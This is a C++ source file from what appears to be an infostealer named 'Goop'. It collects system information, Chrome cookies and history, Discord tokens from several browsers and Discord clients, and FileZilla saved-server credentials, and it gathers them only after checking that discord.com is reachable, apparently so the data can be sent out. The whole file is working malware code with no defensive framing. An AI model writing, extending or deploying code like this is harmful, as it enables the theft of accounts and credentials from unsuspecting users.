#include "goop.h"
#include <WinInet.h>

#include "system.h"
#include "chrome.h"
#include "discord.h"
#include "filezilla.h"

Goop::Goop() noexcept
{
	if (!this->ValidateEnvironment())
	{
		return;
	}

	this->LoadPaths();

	System system;

	if (system.GetStatus())
	{
		this->sGoopedData.append(system.GetData());
	}

	Chrome chrome(this->umssPaths["chrome_base"]);
	if (chrome.GetStatus())
	{
		this->sGoopedData.append("Chrome data:\n" + chrome.GetData());
	}
	
	Discord discord(this->vsDiscordPaths);
	if (discord.GetStatus())
	{
		this->sGoopedData.append("Discord data:\n" + discord.GetData());
	}
	
	Filezilla filezilla(this->umssPaths["filezilla"]);
	if (filezilla.GetStatus())
	{
		this->sGoopedData.append("Filezilla data:\n\n" + filezilla.GetData());
	}
}


bool Goop::GetStatus() noexcept
{
	return !(this->sGoopedData.empty());
}

std::string Goop::GetGoopedData() noexcept
{
	return this->sGoopedData;
}

bool Goop::ValidateEnvironment() noexcept
{
	//If we can't communicate the data, it's pointless to goop them.
	if (!InternetCheckConnectionA("https://discord.com", FLAG_ICC_FORCE_CONNECTION, 0))
		return false;

	return true;
}

void Goop::LoadPaths() noexcept
{
	std::string roaming		= getenv("appdata");
	std::string local		= getenv("localappdata");

	//Get common paths
	this->umssPaths = {
		{"roaming", roaming},
		{"local", local},
		{"chrome_base", local + "\\Google\\Chrome\\User Data\\"},
		{"chrome_cookies", local + "\\Google\\Chrome\\User Data\\Default\\Network\\Cookies"},
		{"chrome_history", local + "\\Google\\Chrome\\User Data\\Default\\History"},
		{"filezilla", roaming + "\\FileZilla\\sitemanager.xml"}
	};

	//Get common discord token paths
	this->vsDiscordPaths = {
		roaming + "\\discord\\",
		roaming + "\\discordcanary\\",
		roaming + "\\Lightcord\\",
		local + "\\Google\\Chrome\\User Data\\Default\\",
		local + "\\Google\\Chrome\\User Data\\Profile 1\\",
		local + "\\Google\\Chrome\\User Data\\Profile 2\\",
		local + "\\Google\\Chrome\\User Data\\Profile 3\\",
		local + "\\Google\\Chrome\\User Data\\Profile 4\\",
		local + "\\Google\\Chrome\\User Data\\Profile 1\\",
		local + "\\Microsoft\\Edge\\User Data\\Defaul\\",
		roaming + "\\Opera Software\\Opera Stable\\",
		roaming + "\\Opera Software\\Opera GX Stable\\",
		local + "\\BraveSoftware\\Brave - Browser\\User Data\\Default\\"
	};
}